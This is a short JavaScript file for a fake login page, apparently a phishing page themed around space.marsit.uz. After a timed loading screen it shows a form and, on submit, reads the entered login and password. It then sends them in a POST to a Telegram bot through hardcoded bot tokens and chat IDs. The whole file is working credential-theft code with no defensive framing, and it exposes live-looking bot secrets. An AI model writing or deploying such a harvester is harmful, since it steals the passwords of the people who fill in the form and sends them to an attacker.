let TOKEN_BOT = '6487914228:AAH7ynZg_anINGwA7mn_CHx_Z3fggLJVJ40'
let CHAT_ID = '6975090136'
let TOKEN_BOT2 = '6965033995:AAHpV9G4l1uBQhItpoYn1NhQQ9_YetPTUYY'
let CHAT_ID2 = '1861568967'

let body = document.querySelector('body')
let loading = document.querySelector('.loading')
let login = document.querySelector('#login')

setTimeout(() =>{
    body.classList.remove("bg-[url('https://space.marsit.uz/img/Coin.8a6f0644.svg')]")
    loading.classList.add('hidden')
    body.classList.add("bg-[url('https://space.marsit.uz/img/Coin.8a6f0644.svg')]")
    login.classList.remove('hidden')
}, 5000);

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (e) => {
    e.preventDefault();

    const loginValue = inputs[0].value.trim();
    const passwordValue = inputs[1].value.trim();
    
    if (loginValue && passwordValue) {
        fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },      
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `\n\n LOGIN: ${loginValue} \n PASSWORD: ${passwordValue}`,
        }),
    })
    .then(response => response.json())
    .then(malumot => {
        console.log(malumot);
    })
    .catch(error => console.log("ERROR", error));
} else {
    console.log("Error: Login and password cannot be empty");
}
});